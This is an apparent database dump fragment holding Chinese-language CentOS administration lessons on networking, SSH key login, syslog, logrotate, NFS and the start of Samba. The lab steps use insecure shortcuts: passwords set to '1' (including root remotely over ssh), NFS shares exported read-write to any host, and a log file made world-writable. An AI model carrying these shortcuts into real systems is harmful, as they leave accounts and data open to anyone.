&gt; /proc/sys/net/ipv4/ip_forward&nbsp;临时生效<br>2.vim /etc/sysctl.conf	永久性生效(路由转发)<br><br>net.ipv4.ip_forward = 1<br>sysctl -p<br><br>内核参数调整<br><br>cat /proc/sys/net/ipv4/icmp_echo_ignore_broadcasts 1关闭对广播包的回应<br>cat /proc/sys/net/ipv4/icmp_echo_ignore_all 0关闭对ping包的回应<br><br>=============================================================================<br><br><br>网络配置：<br>========<br>=============================================================================<br><br>方法一：直接手工修改相应的文件<br><br>[root@localhost ~]#&nbsp;vim /etc/sysconfig/network<br><br>NETWORKING=yes<br>NETWORKING_IPV6=yes<br>HOSTNAME=station40.uplooking.com	//主机名<br><br>[root@station40 ~]#&nbsp;hostname station40.uplooking.com	//临时设置<br>[root@station40 ~]#&nbsp;ping station40.uplooking.com<br><br>ping: unknown host station40.uplooking.com	//新主机名无法解析<br><br>[root@station40 ~]#&nbsp;vim /etc/hosts<br><br>127.0.0.1 localhost<br>192.168.0.40 station40.uplooking.com station40<br><br>[root@station40 ~]#&nbsp;vim /etc/sysconfig/network-scripts/ifcfg-eth0<br><br>静态，手工<br>DEVICE=eth0<br>BOOTPROTO=none<br>ONBOOT=yes<br>NETMASK=255.255.255.0<br>IPADDR=192.168.0.40<br>GATEWAY=192.168.0.254<br>TYPE=Ethernet<br><br>动态, dhcp<br>DEVICE=eth0<br>BOOTPROTO=dhcp<br>ONBOOT=yes<br>TYPE=Ethernet<br><br>[root@station40 ~]#&nbsp;service network restart<br><br>[root@station40 ~]#&nbsp;vim /etc/resolv.conf<br>nameserver 202.106.0.20<br>nameserver 8.8.8.8<br><br>=========================================================================<br><br>方法二：setup（文本图形工具tui）<br><br>setup<br><br>edit devices: IP/掩码/网关	设置自动获取<br>edit DNS configuration: 主机名/DNS<br>[root@station40 ~]#&nbsp;service network restart<br><br>查询：<br>主机名: hostname<br>ip: ip addr<br>网关: ip route<br>DNS: cat /etc/resolv.conf<br><br>==========================================================================<br><br>给一个网卡绑定多个IP<br><br>临时绑定：<br>ifconfig eth0:0 10.10.10.1 网卡别名<br><br>永久生效：<br>[root@station02 ~]#&nbsp;cd /etc/sysconfig/network-scripts/<br>[root@station02 network-scripts]#&nbsp;ls<br>ifcfg-eth0 ifdown-isdn ifup-aliases ifup-plip ifup-wireless<br>ifcfg-lo ifdown-post ifup-bnep ifup-plusb init.ipv6-global<br>ifdown ifdown-ppp ifup-eth ifup-post net.hotplug<br>ifdown-bnep ifdown-routes ifup-ippp ifup-ppp network-functions<br>ifdown-eth ifdown-sit ifup-ipsec ifup-routes network-functions-ipv6<br>ifdown-ippp ifdown-sl ifup-ipv6 ifup-sit<br>ifdown-ipsec ifdown-tunnel ifup-ipx ifup-sl<br>ifdown-ipv6 ifup ifup-isdn ifup-tunnel<br><br>[root@station02 network-scripts]#&nbsp;cp ifcfg-eth0 ifcfg-eth0:0<br>[root@station02 network-scripts]#&nbsp;cat ifcfg-eth0:0<br><br>DEVICE=eth0:0	//子接口名<br>BOOTPROTO=static<br>HWADDR=00:0C:29:B4:09:DF<br>IPADDR=192.168.1.2	//IP<br>NETMASK=255.255.255.0<br>ONBOOT=yes<br><br>[root@station02 network-scripts]#&nbsp;service network restart<br>正在关闭接口 eth0：	[确定]<br>关闭环回接口：	[确定]<br>弹出环回接口：	[确定]<br>弹出界面 eth0：	[确定]<br><br>[root@station02 ~]#&nbsp;ip addr<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 16436 qdisc noqueue&nbsp;<br>link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>inet 127.0.0.1/8 scope host lo<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast qlen 1000<br>link/ether 00:0c:29:b4:09:df brd ff:ff:ff:ff:ff:ff<br>inet 192.168.0.2/24 brd 192.168.0.255 scope global eth0<br>inet 192.168.1.2/24 brd 192.168.1.255 scope global eth0:0<br><br><br>网络地址 主机地址<br>010	88888888&nbsp;<br>192.168.0 40&nbsp;<br>192.168.0 7<br>192.168.1 201<br><br>192.168.0.40/255.255.255.0	主机地址<br>192.168.0.0/255.255.255.0	网络地址 192.168.0.0/24<br><br>255	255	255	0<br>11111111 11111111 11111111 00000000<br></dd><dt>SSH</dt><p></p><dd><span>ssh服务<br></span><br><span>ssh<br>scp<br>rsync</span><br><br>================================================================================<br><br>[root@station40 ~]#<span>&nbsp;</span><span>ps aux |grep sshd</span><br>root 2697 0.0 0.0 7220 1060 ? Ss Sep21 0:00 /usr/sbin/sshd<br><br>[root@station40 ~]#<span>&nbsp;</span><span>netstat -tnlp | grep 22</span><br>tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 2697/sshd<span>&nbsp;</span><br><br>[root@station40 ~]#<span>&nbsp;</span><span>service sshd status</span><br>openssh-daemon (pid 2697) 正在运行...<br><br>[root@station40 ~]#<span>&nbsp;</span><span>chkconfig sshd --list</span><br>sshd 0:关闭 1:关闭 2:启用 3:启用 4:启用 5:启用 6:关闭<br><br>=================================================================================<br><br><span>命令用法：<br></span><br><span>ssh 192.168.0.71</span>	<br><span>ssh root@192.168.0.71</span><br><span>ssh -X 192.168.0.71</span>	//可以运行远程主机的图形<br><span>ssh 192.168.0.71 \'date\'</span>	//在远程主上执行某个shell命令<br><span>ssh 192.168.0.71 \'echo 1 | passwd root --stdin\'</span>	//修改远程主机的密码为1（root）<br><span>ssh 192.168.0.71 \'date\';date</span><br><br>==================================================================================<br><br><span>配置：<br></span><br>/etc/ssh/ssh_config 客户端配置文件<br><br>/etc/ssh/sshd_config sshd服务器配置文件<br><span>UseDNS no<br>GSSAPIAuthentication no<br>PermitRootLogin no<br>AllowUsers jack</span>	//只允许特定的用户登录<br><br>平常管理习惯：<br>1. 使用普通用户登录<br>2. su或sudo<br><br>===================================================================================<br><br><span>使用公钥认证<br></span><br><span>1. 客户端生成公钥和私钥<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>ssh-keygen</span><br>[root@station40 ~]#<span>&nbsp;</span><span>ls .ssh/</span><br>id_rsa id_rsa.pub known_hosts<br><br><span>2. 把公钥上传到需要登录的服务器（放在特定的位置）<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>ssh-copy-id -i 192.168.0.71</span><br>root@192.168.0.71\'s password:<span>&nbsp;</span><br>Now try logging into the machine, with \"ssh \'192.168.0.71\'\", and check in:<br><br>.ssh/authorized_keys	//对方<br><br>to make sure we haven\'t added extra keys that you weren\'t expecting.<br><br>[root@station40 ~]#<span>&nbsp;</span><span>ssh-copy-id -i .ssh/id_rsa.pub 192.168.0.24	</span>//指定公钥<br><br>===================================================================================<br><br><span>练习题：</span><br><br>===================================================================================<br><br><span>要求三台集群主机能够以oracle、grid互相登录，且使用公钥认证</span><br><br>rac1	192.168.0.40<br>rac2	192.168.0.15<br>rac3	192.168.0.14<br><br>0. [root@station40 ~]#<span>&nbsp;</span><span>vim /etc/hosts</span><br>127.0.0.1 localhost<br>192.168.0.40 rac1<br>192.168.0.14 rac2<br>192.168.0.15 rac3<br><br>[root@station40 ~]#<span>&nbsp;</span><span>rsync -a /etc/hosts 192.168.0.14:/etc/</span><br>[root@station40 ~]#<span>&nbsp;</span><span>rsync -a /etc/hosts 192.168.0.15:/etc/</span><br><br><br><span>1. 需要在三台机器上建立oracle、grid用户，密码设置为1<br></span><br>[root@station40 ~]#<span>&nbsp;</span><span>useradd oracle</span><br>[root@station40 ~]#<span>&nbsp;</span><span>useradd grid</span><br>[root@station40 ~]#<span>&nbsp;</span><span>echo 1 | passwd oracle --stdin</span><br>[root@station40 ~]#<span>&nbsp;</span><span>echo 1 | passwd grid --stdin</span><br><br><span>2. 做grid用户的公钥认证<br></span><br><span>a. rac1: (随便找一台)</span><br>[root@station40 ~]#<span>&nbsp;</span><span>su - grid</span><br>[grid@station40 ~]$<span>&nbsp;</span><span>ssh-keygen</span><span>&nbsp;</span>（一路回车）<br>[grid@station40 ~]$<span>&nbsp;</span><span>cd .ssh/</span><br>[grid@station40 .ssh]$<span>&nbsp;</span><span>ls</span><br>id_rsa id_rsa.pub<br>[grid@station40 .ssh]$<span>&nbsp;</span><span>mv id_rsa.pub authorized_keys</span><br><br><span>b. 复制.ssh目录到对方对应的目录中</span><br>[grid@station40 ~]$<span>&nbsp;</span><span>rsync -a ~grid/.ssh 192.168.0.14:~grid/</span><br>[grid@station40 ~]$<span>&nbsp;</span><span>rsync -a ~grid/.ssh 192.168.0.15:~grid/</span><br>[grid@station40 ~]$<span>&nbsp;</span><span>rsync -a ~/.ssh 192.168.0.15:~/</span>	最简<br><br><span><br>3. 做oracle用户的公钥认证</span><br>[root@station40 ~]#<span>&nbsp;</span><span>rsync -a 2012-09-22-etc.tar root@192.168.0.68:/</span><br>[root@station40 ~]#<span>&nbsp;</span><span>scp -r 2012-09-22-etc.tar root@192.168.0.68:/</span><br><br>==============================================================================================<br><br><span>从windows端连接时使用公钥认证<br></span><br><span>1. 使用某种生成密钥对的工具生成公钥，私钥（为了安全，应该给私钥设置口令）<br>2. 将公钥上传到服务器上<br>3. 转换并存放到某个用户的认证文件</span>(例如：~root/.ssh/authorized_keys)<br>~alice/.ssh/authorized_keys<br><br>[root@station40 ~]#<span>&nbsp;</span><span>cat 40pub<span>&nbsp;</span></span><br>---- BEGIN SSH2 PUBLIC KEY ----<br>Comment: \"rsa-key-20120918\"<br>AAAAB3NzaC1yc2EAAAABJQAAAIB3MuahExJmoxlyCo9ZqxZP8EJsu1gdS4NeH2SO<br>YNn8K+5Bht5Rt5/G8SFl9VNxfilr65l7THvwYWsSh4FDS/29fLtA96UwL6EV/T1h<br>xNlbdNdeJ0tSzkvrcHlms2KTbbglUmvX3NKSq1+HPmtX5Nti/04e1Xzt6ePXbpVV<br>+xfDew==<br>---- END SSH2 PUBLIC KEY ----<br>[root@station40 ~]#<span>&nbsp;</span><span>ssh-keygen -i -f 40pub<span>&nbsp;</span></span><br>ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIB3MuahExJmoxlyCo9ZqxZP8EJsu1gdS4NeH2SOYNn8K+5Bht5Rt5/G8SFl9VNxfilr65l7THvwYWsSh4FDS/29fLtA96UwL6EV/T1hxNlbdNdeJ0tSzkvrcHlms2KTbbglUmvX3NKSq1+HPmtX5Nti/04e1Xzt6ePXbpVV+xfDew==<br>[root@station40 ~]#<span>&nbsp;</span><span>ssh-keygen -i -f 40pub &gt;&gt; ~/.ssh/authorized_keys</span></dd><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.jpg','centos:latest','2016-10-13 11:17:12',1,NULL,'',0,''),(73,'linux基础课程训练十二','linux日志管理方面的命令','<p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用了。</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p><p>日志管理：<br><br>一种是可以通过syslog记录日志<br>有些应用程序可以以自己的方式记录日志，例如httpd,nginx<br><br><br></p><dl><dt>syslog服务</dt><dd><span>syslog服务</span><br><br>============================================================================<br><br>[root@station40 ~]#<span>&nbsp;</span><span>service syslog status</span><br>syslogd (pid 2216) 正在运行...<br>klogd (pid 2219) 正在运行...<br><br>[root@station40 ~]#<span>&nbsp;</span><span>ps aux |grep log</span><br>root 2216 0.0 0.0 1820 584 ? Ss Oct01 0:00 syslogd -m 0<br>root 2219 0.0 0.0 1768 412 ? Ss Oct01 0:00 klogd -x<br>root 6918 0.0 0.0 4268 708 pts/3 R+ 00:52 0:00 grep log<br><br>[root@station40 ~]#<span>&nbsp;</span><span>ls /var/log/</span><br>acpid conman.old maillog scrollkeeper.log vnetlib<br>anaconda.log cron messages secure wtmp<br>anaconda.syslog cups pm setroubleshoot xferlog<br>anaconda.xlog dmesg ppp spooler Xorg.0.log<br>audit faillog prelink tallylog Xorg.0.log.old<br>boot.log gdm rhsm vbox yum.log<br>btmp lastlog rpmpkgs vmware<br>conman mail samba vmware-installer<br><br><span>tail /var/log/messages<br>tail -n 20 /var/log/messages</span><br><span>tail -f /var/log/messages<span>&nbsp;</span></span>系统主日志<br><br><span>tail -f /var/log/secure</span>	跟安全、认证相关<br><span>tail /var/log/maillog</span>	跟邮件（sendmail、postfix）相关<br><span>tail /var/log/cron</span>	crond进程产生的日志<br><span>tail /var/log/dmesg</span><br><br>===============================================================================<br><br><span>syslog两个组件：<br></span><br><span>klogd:	kernel相关日志	</span># tail /var/log/dmesg （dmesg）<br><span>syslogd： 系统相关日志	</span># vim /etc/syslog.conf<span>&nbsp;</span><br><br>[root@station40 ~]#<span>&nbsp;</span><span>vim /etc/syslog.conf<span>&nbsp;</span></span><br><br><span>告诉syslogd进程去记录哪个设备facility关于哪个级别的信息，以及记录到哪个地方去（文件/设备）</span><br><br>*.info;mail.none;authpriv.none;cron.none /var/log/messages<br>authpriv.* /var/log/secure<br>mail.* -/var/log/maillog<br>cron.* /var/log/cron<br><br><span>对象（设备facility/类别）	级别	动作action</span><br>mail	info	/var/log/maillog<br>cron	*	@192.168.0.100<br>authpriv	none	* (所有用户)<br><br>================================================================================<br><br><span>查看日志对象和级别：<br></span><br>man 3 syslog<br><br><span>facility设备 即产生日志的对象</span><br><span>LOG_AUTH<br>＊ LOG_AUTHPRIV 安全认证<br>＊ LOG_CRON 计划任务cron和at<br>＊ LOG_DAEMON 其它后台工具<br>LOG_FTP FTP<br>＊ LOG_KERN kernel<br>＊ LOG_LOCAL0 through LOG_LOCAL7 用户自定义的对象<br>LOG_LPR 打印<br>＊ LOG_MAIL 邮件系统<br>LOG_NEWS USENET news subsystem<br>LOG_SYSLOG syslogd自身产生日志<br>LOG_USER (default) generic user-level messages<br>LOG_UUCP UUCP subsystem</span><br><br><span>level 级别 即上面的设备/对象他们遇到何种情况（正常、错误）才会记录日志</span><br><span>LOG_EMERG	紧急、致命，服务无法继续运行，如配置文件丢失	<br>LOG_ALERT	报警，需要立即处理，如硬盘容量使用90%<br>LOG_CRIT	致命行为<br>LOG_ERR 错误行为<br>LOG_WARNING 警告信息<br>LOG_NOTICE	普通<br>LOG_INFO 标准信息<br>LOG_DEBUG	调试信息，排错所需，一般不用<br><br>mail.err 只要err级别以上信息<br>mail.=err 只要err信息<br>mail.!=err 除了err信息全要</span><br><br>==================================================================================<br><br><span>示例1：将日志记录到一个自定义文件<br></span>mail	info /log<br><br><span>示例2：将日志发送个某个用户</span><br>*.info;mail.none;authpriv.none;cron.none robin<span><br><br>示例3：将安全认证日志记录到一个设备，例如/dev/pts/1</span><br>authpriv.* /dev/pts/1<br>[root@station40 ~]#<span>&nbsp;</span><span>service syslog restart</span><br>关闭内核日志记录器： [确定]<br>关闭系统日志记录器： [确定]<br>启动系统日志记录器： [确定]<br>启动内核日志记录器： [确定]<br><br><span>示例4:手动写日志</span><br>[root@station40 ~]#<span>&nbsp;</span><span>logger \"tianyun hello\"	</span><br>[root@station40 ~]#<span>&nbsp;</span><span>tail -f /var/log/message<br><br></span>=====================================================================================<span><br></span><br><span>远程日志(集中式)<br></span><span><br>接收日志服务器：192.168.0.2</span><br>[root@station02 ~]#<span>&nbsp;</span><span>vim /etc/sysconfig/syslog</span><br>SYSLOGD_OPTIONS=\"-r -m 0\"<br>[root@station02 ~]#<span>&nbsp;</span><span>service syslog restart</span><br>关闭内核日志记录器： [确定]<br>关闭系统日志记录器： [确定]<br>启动系统日志记录器： [确定]<br>启动内核日志记录器： [确定]<br><br>[root@station02 ~]#<span>&nbsp;</span><span>netstat -tunlp |grep syslog</span><br>udp 0 0 0.0.0.0:514 0.0.0.0:* 4123/syslogd<span>&nbsp;</span><br>[root@station02 ~]#<span>&nbsp;</span><span>netstat -tunlp |grep :514</span><br>udp 0 0 0.0.0.0:514 0.0.0.0:* 4123/syslogd<span>&nbsp;</span><br>[root@station02 ~]#<span>&nbsp;</span><span>tail -f /var/log/secure</span><br><br><span>客户端：</span><br>[root@station40 ~]#<span>&nbsp;</span><span>vim /etc/syslog.conf</span><br>authpriv.* @192.168.0.2<br>[root@station40 ~]#<span>&nbsp;</span><span>service syslog restart</span><br>关闭内核日志记录器： [确定]<br>关闭系统日志记录器： [确定]<br>启动系统日志记录器： [确定]<br>启动内核日志记录器： [确定]<br>[root@station40 ~]#<span>&nbsp;</span><span>ssh localhost</span><br><br>================================================================================<br><br><span>logrotate（轮转）<br></span><br><span>将丢弃系统中最旧的日志文件，以节省空间。<br>本身不是一个系统进程，它是通过计划任务cron每天执行</span><br><br>[root@station40 ~]#<span>&nbsp;</span><span>ls /etc/cron.daily</span><br>0anacron cups makewhatis.cron prelink rpm<br>0logwatch logrotate mlocate.cron rhsmd tmpwatch<br><br>[root@station40 ~]#<span>&nbsp;</span><span>cat /etc/cron.daily/logrotate<span>&nbsp;</span><br></span><br><span>#!/bin/sh<br><br>/usr/sbin/logrotate /etc/logrotate.conf<br>EXITVALUE=$?<br>if [ $EXITVALUE != 0 ]; then<br>/usr/bin/logger -t logrotate \"ALERT exited abnormally with [$EXITVALUE]\"<br>fi<br>exit 0</span><br><br><span>主配置文件：(每个日志文件如何轮转)</span><br>[root@station40 ~]#<span>&nbsp;</span><span>vim /etc/logrotate.conf<br></span><br>weekly	//轮转的频率，一周轮转	# cat /var/lib/logrotate.status<span>&nbsp;</span><br>rotate 4	//保留4份<br>create	//轮转后创建新文件<br>#compress	//进行压缩 ==从此处到最上面：全局设置<br>include /etc/logrotate.d<br>/var/log/wtmp {<br>monthly	//一月轮转一次<br>minsize 1M	//最小达到1M<br>create 0664 root utmp	//转转后创建的新文件权限<br>rotate 1	//保留一次<br>}<br><br>/var/log/btmp {<br>missingok	//丢失不提示<br>monthly	//一月轮转一次<br>minsize 1M<br>create 0600 root utmp<br>rotate 1<br>}<br><br><span>子配置文件存放目录：</span><br>[root@station40 ~]#<span>&nbsp;</span><span>ls /etc/logrotate.d/</span><br>acpid iscsiuiolog psacct setroubleshoot syslog wpa_supplicant<br>conman mgetty rpm snmpd up2date yum<br>cups ppp samba subscription-manager vsftpd.log<br><br>[root@station40 logrotate.d]#<span>&nbsp;</span><span>cat syslog	</span>//定义的是由syslog管理的日志文件<br>/var/log/messages /var/log/secure /var/log/maillog /var/log/spooler /var/log/boot.log /var/log/cron {<br>sharedscripts<br>postrotate	//轮转之后做什么<br>/bin/kill -HUP `cat /var/run/syslogd.pid 2&gt; /dev/null` 2&gt; /dev/null || true<br>/bin/kill -HUP `cat /var/run/rsyslogd.pid 2&gt; /dev/null` 2&gt; /dev/null || true<br>endscript<br>}<br><br>[root@station40 ~]#<span>&nbsp;</span><span>vim /etc/logrotate.d/yum</span><span>&nbsp;</span><br>/var/log/yum.log {<br>missingok	//丢失不提醒<br>notifempty	//如果为空不轮转<br>size 30k	//30K<br>yearly	//一年轮转一次<br>create 0600 root root<br>}<br><br><br><span>示例：</span><br>[root@station40 ~]#<span>&nbsp;</span><span>vim /etc/logrotate.d/yum</span><br>/var/log/yum.log {<br>missingok	<br># notifempty<br># size 30k<br># yearly<br>daily	//一天轮转一次<br>rotate 3	//保留最近三次<br>create 0777 root root<br>}<br><br>[root@station40 ~]#<span>&nbsp;</span><span>date 100905002012</span><br>[root@station40 ~]#<span><span>&nbsp;</span>grep \'yum\' /var/lib/logrotate.status</span><span>&nbsp;</span>//记录所有日志文件最近轮转时间<br>\"/var/log/yum.log\" 2012-10-9<br>[root@station40 ~]#<span>&nbsp;</span><span>ll /var/log/yum.log*</span><br>-rwxrwxrwx 1 root root 0 10-09 05:00 /var/log/yum.log<br>-rw------- 1 root root 0 10-08 05:00 /var/log/yum.log.1<br>-rw------- 1 root root 0 10-05 05:00 /var/log/yum.log.2<br>-rw------- 1 root root 61 10-03 05:27 /var/log/yum.log.3</dd></dl><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/centos.jpg','centos:latest','2016-10-13 11:18:33',1,NULL,'',0,''),(74,'linux基础课程训练十三','linux文件服务器方面的操作','<p>说明：我虚拟环境使用的是centos,可以通过&nbsp;cat&nbsp;/etc/issue来查看，如果发现测试的命令找不到\r\n</p><p>可以使用yum&nbsp;install&nbsp;-y&nbsp;命令&nbsp;先插入这个命令再去运行试一试。比如man命令可能运行不了。yum&nbsp;install&nbsp;-y&nbsp;man&nbsp;之后就可以正常使用了。</p><p>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</p><p><br></p><p>常见文件服务器<br><br>nfs,samba,vsftpd&nbsp;<br><br>===========================================================================<br><br>常见的三种存储方案<br><br>DAS 直连式存储<br><br>NAS 网络附加存储 共享是文件系统 （文件系统在服务器端）<br>NFS&nbsp;Network File System	网络文件系统：Unix系统之间共享文件的一种协议<br>CIFS&nbsp;Common Internet File System	Windows和Unix系统之间共享文件的一种协议<br>HTTP&nbsp;Hypertext transfer protocal	超文本传输协议<br><br>SAN 存储区域网络 共享的是块设备 （文件系统在客户端）<br>FC SAN&nbsp;通过FC光纤网络传输scsi协议<br>光纤交换机 SAN交换机<br>光纤卡 HBA卡<br>光纤线<br>IP SAN&nbsp;通过IP网络（以太网络）传输scsi协议，一种廉价的SAN解决方法，例如ISCSI（openfiler）<br><span style=\"font-weight: 700; line-height: 1;\"><br></span></p><p><span style=\"font-weight: 700; line-height: 1;\">NFS</span><br></p><dl><dd><span>NAS之NFS<br><br></span>=====================================================================================<span><br></span><br><span>一、NFS服务器<br></span><br><span>1. 软件包 nfs-utils</span><br><span>2. 端口 2049/tcp</span><br><span>3. 配置文件 /etc/exports<br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>mkdir -p /share/dir1 /share/dir2</span><br>[root@station02 ~]#<span>&nbsp;</span><span>chmod 777 /share/dir2</span><br>[root@station02 ~]#<span>&nbsp;</span><span>touch /share/dir1/1</span><br>[root@station02 ~]#<span>&nbsp;</span><span>touch /share/dir2/2</span><br><br>[root@station02 ~]#<span>&nbsp;</span><span>vim /etc/exports<br></span><br>/share/dir1 192.168.0.0/24(ro,sync)<br>/share/dir2 *(rw,sync)<br><br><span>4. 启动<br></span>[root@station02 ~]#<span><span>&nbsp;</span>service portmap start<span>&nbsp;</span></span>#守护进程<br>[root@station02 ~]#<span>&nbsp;</span><span>service nfs restart</span><br>关闭 NFS mountd： [失败]<br>关闭 NFS 守护进程： [失败]<br>关闭 NFS quotas： [失败]<br>启动 NFS 服务： [确定]<br>关掉 NFS 配额： [确定]<br>启动 NFS 守护进程： [确定]<br>启动 NFS mountd： [确定]<br><br>[root@station02 ~]#<span>&nbsp;</span><span>chkconfig nfs on</span><br>[root@station02 ~]#<span>&nbsp;</span><span>exportfs -r</span>	//reload<br>[root@station02 ~]#<span>&nbsp;</span><span>exportfs -v</span>	//显示当前输出的所有共享<br>[root@station02 ~]#<span>&nbsp;</span><span>ps aux |grep nfs</span><br>root 4156 0.0 0.0 0 0 ? S&lt; 20:29 0:00 [nfsd4]<br>root 4158 0.0 0.0 0 0 ? S 20:29 0:00 [nfsd]<br>root 4159 0.0 0.0 0 0 ? S 20:29 0:00 [nfsd]<br>root 4160 0.0 0.0 0 0 ? S 20:29 0:00 [nfsd]<br>root 4161 0.0 0.0 0 0 ? S 20:29 0:00 [nfsd]<br>root 4162 0.0 0.0 0 0 ? S 20:29 0:00 [nfsd]<br>root 4163 0.0 0.0 0 0 ? S 20:29 0:00 [nfsd]<br>root 4164 0.0 0.0 0 0 ? S 20:29 0:00 [nfsd]<br>root 4165 0.0 0.0 0 0 ? S 20:29 0:00 [nfsd]<br>root 4314 0.0 0.2 5128 676 pts/1 R+ 21:20 0:00 grep nfs<br><br>[root@station02 ~]#<span>&nbsp;</span><span>netstat -tnlp | grep :2049</span><br>tcp 0 0 0.0.0.0:2049 0.0.0.0:* LISTEN -<br>[root@station02 ~]#<span>&nbsp;</span><span>netstat -an |grep 2049</span><br>tcp 0 0 0.0.0.0:2049 0.0.0.0:* LISTEN<span>&nbsp;</span><br>tcp 0 0 192.168.0.2:2049 192.168.0.120:927 ESTABLISHED<span>&nbsp;</span><br>udp 0 0 0.0.0.0:2049 0.0.0.0:*<span>&nbsp;</span><br><br>====================================================================================<br><br><span>二、NFS客户端<br></span><br>[root@station11 ~]#<span>&nbsp;</span><span>showmount -e 192.168.0.2</span><br>Export list for 192.168.0.2:<br>/share/dir2 *<br>/share/dir1 192.168.0.0/24<br><br>[root@station11 ~]#<span>&nbsp;</span><span>mkdir /mnt/dir1 /mnt/dir2</span><br>[root@station11 ~]#<span>&nbsp;</span><span>mount -t nfs 192.168.0.2:/share/dir1 /mnt/dir1</span><br>[root@station11 ~]#<span>&nbsp;</span><span>mount -t nfs 192.168.0.2:/share/dir2 /mnt/dir2</span><br>[root@station11 ~]#<span>&nbsp;</span><span>ls /mnt/dir1</span><br>1<br>[root@station11 ~]#<span>&nbsp;</span><span>ls /mnt/dir2</span><br>2<br><br>==================================================================<br><br><span>探究nfs挂载时权限的验证方式<br></span><span><br></span><span>服务器端：<br>=======<br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>useradd alice</span><br>[root@station02 ~]#<span>&nbsp;</span><span>mkdir /share/dir3</span><br>[root@station02 ~]#<span>&nbsp;</span><span>chown alice.alice /share/dir3</span><br>[root@station02 ~]#<span>&nbsp;</span><span>id alice</span><br>uid=500(alice) gid=500(alice) groups=500(alice)<br>[root@station02 ~]#<span>&nbsp;</span><br>[root@station02 ~]#<span>&nbsp;</span><span>vim /etc/exports<span>&nbsp;</span></span><br>/share/dir1 192.168.0.0/24(ro,sync)<br>/share/dir2 *(rw,sync)<br>/share/dir3 *(rw,sync)	//目录对于其他人没有写权限<br><br>[root@station02 ~]#<span><span>&nbsp;</span>exportfs -r</span><br>[root@station02 ~]#<span>&nbsp;</span><span>exportfs -v</span><br>/share/dir1 192.168.0.0/24(ro,wdelay,root_squash,no_subtree_check,anonuid=65534,anongid=65534)<br>/share/dir2 &lt;world&gt;(rw,wdelay,root_squash,no_subtree_check,anonuid=65534,anongid=65534)<br>/share/dir3 &lt;world&gt;(rw,wdelay,root_squash,no_subtree_check,anonuid=65534,anongid=65534)<br><br><span>从客户端测试：<br>===========<br></span><br>首先以root用户挂载<br>[root@station11 ~]#<span>&nbsp;</span><span>mkdir /mnt/dir3</span><br>[root@station11 ~]#<span>&nbsp;</span><span>mount 192.168.0.2:/share/dir3 /mnt/dir3</span><br>[root@station11 ~]#<span>&nbsp;</span><span>touch /mnt/dir3/file1</span><br>touch: 无法触碰 “/mnt/dir3/file1”: 权限不够<br>[root@station11 ~]#<span>&nbsp;</span><span>useradd jack</span><br>[root@station11 ~]#<span>&nbsp;</span><span>id jack</span><br>uid=500(jack) gid=500(jack) groups=500(jack)<br><br>以jack用户访问（普通用户是不能使用mount命令挂载任何文件系统）<br>[root@station11 ~]#<span>&nbsp;</span><span>su - jack</span><br>[jack@station11 ~]$<span>&nbsp;</span><span>touch /mnt/dir3/file1</span><br><br><span>====</span><br><span>分析：<br>====</span><br><span>1. 对比服务端和客户端文件属性</span><br>[root@station02 ~]#<span>&nbsp;</span><span>ll -dn /share/dir3	</span>//服务器端<br>drwxr-xr-x 2 500 500 4096 10-02 20:45 /share/dir3<br><br>[root@station11 ~]#<span>&nbsp;</span><span>ll -dn /mnt/dir3</span>	//客户端<br>drwxr-xr-x 2 500 500 4096 2012-10-02 /mnt/dir3<br><br><span>====<br>结果：<br>====</span><br><span>NFS权限是通过UID、GID映射的<span>&nbsp;</span><br>从客户端如果使用root访问，将默认映射为nfsnobody（服务端在共享时使用了root_squash,服务端共享时添加参数no_root_squash可以让目录拥有写权限）</span><br><br><span>如果希望两端的UID和GID能够一样<br>1. useradd tom -u 2000<br>2. 使用LDAP服务器提供统一的UID和GID</span><br><br>================================================================================<br><br><span>再谈客户端挂载：<br></span><br><span>方法一：</span><span>&nbsp;</span><br>[root@station11 ~]#<span>&nbsp;</span><span>mount 192.168.0.2:/share/dir1 /mnt/dir1</span><span>&nbsp;</span>//临时<br><br><span>方法二：<span>&nbsp;</span></span><br><span>vim /etc/fstab<br></span><br>192.168.0.2:/share/dir1 /mnt/dir1 nfs ro 0 0<br>192.168.0.2:/share/dir2 /mnt/dir2 nfs rw 0 0<br><br>[root@station11 ~]# mount -a<br><br><span>方法三：<br>automount (进程autofs)自动挂载，按需挂载<br></span><br>[root@station11 ~]#<span>&nbsp;</span><span>mkdir /mnt/nfs</span>	//准备一个父挂载点，即监控目录<br>[root@station11 ~]#<span>&nbsp;</span><span>vim /etc/auto.master<span>&nbsp;</span></span><br>/mnt/nfs /etc/auto.nfs<br>[root@station11 ~]#<span>&nbsp;</span><span>vim /etc/auto.nfs<span>&nbsp;</span></span><br>dir1 -ro 192.168.0.2:/share/dir1<br>dir2 -rw 192.168.0.2:/share/dir2<br>[root@station11 ~]#<span>&nbsp;</span><span>service autofs restart</span><br><br><br><br><br></dd><dt>SAMBA</dt><dd><span>NAS之CIFS(samba)</span><br><br><span>软件包：samba,samba-common<br>配置文件：/etc/samba/smb.conf<br>端口：	445/tcp, 137-139/tcp</span><br><span><br></span>=======================================================================<br><span><br></span><span>安装配置：</span><span><br></span><br>[root@station02 ~]#<span>&nbsp;</span><span>yum -y install samba</span><br>[root@station02 ~]#<span>&nbsp;</span><span>mkdir /share/smb1</span><br>[root@station02 ~]#<span>&nbsp;</span><span>mkdir /share/smb2</span><br>[root@station02 ~]#<span>&nbsp;</span><span>chmod 777 /share/smb2</span><br><br>[root@station02 ~]#<span>&nbsp;</span><span>vim 